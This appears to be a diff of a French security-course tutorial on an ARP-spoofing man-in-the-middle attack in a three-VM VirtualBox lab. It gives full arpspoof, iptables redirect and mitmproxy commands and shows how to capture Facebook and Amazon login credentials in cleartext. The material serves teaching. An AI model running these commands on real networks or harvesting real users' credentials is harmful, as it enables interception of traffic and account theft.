@@ -1,22 +1,22 @@
-### Tutoriel Complet pour une Attaque Man-in-the-Middle avec Ubuntu 22.04 et VirtualBox
+# Tutoriel Complet pour une Attaque Man-in-the-Middle avec Ubuntu 22.04 et VirtualBox
 
 Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque Man-in-the-Middle (MITM) avec Ubuntu 22.04 sur VirtualBox, incluant toutes les étapes nécessaires, les configurations réseau, et les commandes.
 
-### Pré-requis
+# Pré-requis
 
 - **Logiciel de virtualisation** : VirtualBox (téléchargeable depuis [ici](https://www.virtualbox.org/))
 - **Système d'exploitation** : Ubuntu 22.04 LTS (téléchargeable depuis [ici](https://ubuntu.com/download/desktop))
 - **Trois machines virtuelles** : Une machine attaquante et deux machines victimes
 
-### Configuration des Machines Virtuelles dans VirtualBox
+# Configuration des Machines Virtuelles dans VirtualBox
 
-#### Types de Machines
+## Types de Machines
 
 1. **Machine Attaquant (Attacker)** : Utilisée pour exécuter l'attaque MITM
 2. **Machine Victime 1 (Victim 1)** : Première cible de l'attaque
 3. **Machine Victime 2 (Victim 2)** : Deuxième cible de l'attaque
 
-#### Création des Machines Virtuelles
+## Création des Machines Virtuelles
 
 1. **Créer une nouvelle machine virtuelle** pour chaque rôle (Attacker, Victim1, Victim2) :
    - **Nom** : Attacker, Victim1, Victim2
@@ -29,7 +29,7 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
    - Démarrez chaque machine virtuelle avec l'ISO d'Ubuntu pour l'installation.
    - Suivez les instructions d'installation d'Ubuntu.
 
-### Configuration du Réseau
+## Configuration du Réseau
 
 #### Configuration du Réseau avec Double Adaptateur
 
@@ -131,13 +131,13 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
      ping 10.0.2.20
      ```
 
-### Installation des Outils Nécessaires
+# Installation des Outils Nécessaires
 
-#### Sur la Machine Attaquant (Attacker)
+# Sur la Machine Attaquant (Attacker)
 
 1. **Mettre à jour le système** :
    ```sh
-   sudo apt update && sudo apt upgrade -y
+   sudo apt update -y
    ```
 
 2. **Installer les outils nécessaires** :
@@ -150,14 +150,17 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
    ```
 
-#### Sur les Machines Victimes (Victim1 et Victim2)
+# Sur les Machines Victimes (Victim1 et Victim2)
 
 1. **Mettre à jour le système** :
    ```sh
    sudo apt update && sudo apt upgrade -y
    ```
 
-### Étape 1 : Empoisonner les Tables ARP
+
+# Machine ATTAQUANT ! 
+
+## Étape 1 : Empoisonner les Tables ARP de Victim1
 
 1. **Empoisonner la Table ARP de Victim1**
 
@@ -165,7 +168,7 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
      ```sh
      sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
      ```
-
+## Étape 2 : Empoisonner les Tables ARP de Victim2
 2. **Empoisonner la Table ARP de Victim2**
 
    - Ouvrez un nouveau terminal sur `attacker`.
@@ -173,8 +176,8 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
      ```sh
      sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20
      ```
-# ==========> REGARDER L'annexe 2
-### Étape 2 : Configurer `iptables` pour Rediriger le Trafic HTTP
+
+## Étape 3 : Configurer `iptables` pour Rediriger le Trafic HTTP
 
 1. **Ouvrez un nouveau terminal sur `attacker`**.
 2. **Exécutez la commande suivante pour rediriger le trafic HTTP vers `mitmproxy`** :
@@ -182,12 +185,56 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
    sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8080
    ```
 
-### Étape 3 : Lancer un Proxy MITM
+## Étape 4 : Lancer un Proxy MITM
 
 1. **Sur la machine attaquant, lancez `mitmproxy`** :
    ```sh
    sudo mitmproxy -p 8080
    ```
+
+![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/86b6ef41-af7b-47f7-b787-b4bcfb2a2a28)
+
+
+# IMPORTANT 1:
+- Accéder à http://localhost:8081
+- Cliquez sur le bouton mitmproxy
+- Cliquez sur install Certificates
+- Pour la première fois, vous auriez le message suivant :
+  *If you can see this, traffic is not passing through mitmproxy*
+- *Solution* : Configuer le proxy de votre machine attaquant en manuel sur l'adresse suivante: http://localhost:8080 ou http://127.0.0.1:8080 ou http://10.0.2.10:8080
+- Revenir à l'interface et observer le traffic
+- Ouvrir le navigateur de facebook
+- Essayez de vous connecter (saisir votre username et password et connectez vous)
+- Revenir à http://localhost:8081
+- Dans l'onglet start, mettre le filtre sur facebook
+- Cherchez le POST
+- Observez le username et le password en texte claire
+
+# IMPORTANT 2:
+- Essayez de refaire les mêmes manipulations sur une machine victime.
+- *Résultat :* ça ne fonctionne pas !
+- *Solution* : Configurer le proxy de chacune des machines victimes en manuel pour pointer sur http://10.0.2.10 
+- Revenir à l'interface et observer le traffic (*MACHINE ATTAQUANT*)
+- Ouvrir le navigateur - page d'amazon (*MACHINE VICTIME*)
+- Essayez de vous connecter (saisir votre username et password et connectez vous) (*MACHINE VICTIME*)
+- Revenir à http://localhost:8081 (*MACHINE ATTAQUANT*)
+- Dans l'onglet start, mettre le filtre sur amazon (*MACHINE ATTAQUANT http://localhost:8081*)
+- Cherchez le verbe POST (*MACHINE ATTAQUANT - http://localhost:8081*)
+- Observez le username et le password en texte claire (*MACHINE ATTAQUANT - http://localhost:8081*)
+
+# IMPORTANT 3:
+
+# Pour résumer : 
+## Installer terminator dans la machine de l'attaquant et diviser en 4
+- terminal 1 :  sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
+- terminal 2 :  sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20
+- terminal 3 :  sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8080
+- terminal 4 :  sudo mitmproxy -p 8080
+
+  
+
+
+
 
 ### Vérification et Conclusion
 
@@ -195,7 +242,7 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
    - Sur `Victim1`, ouvrez un navigateur et accédez à un site web HTTP (non HTTPS).
    - Sur `attacker`, vous devriez voir le trafic intercepté dans `mitmproxy`.
 
-# ==========> REGARDER L'annexe 3
+
 
 2. **Arrêter l'Attaque** :
    - Arrêtez `arpspoof` et `mitmproxy` en utilisant `Ctrl + C`.
@@ -203,6 +250,8 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
      ```sh
      sudo iptables -t nat -F
      ```
+
+
 
 ### Résumé des Commandes
 
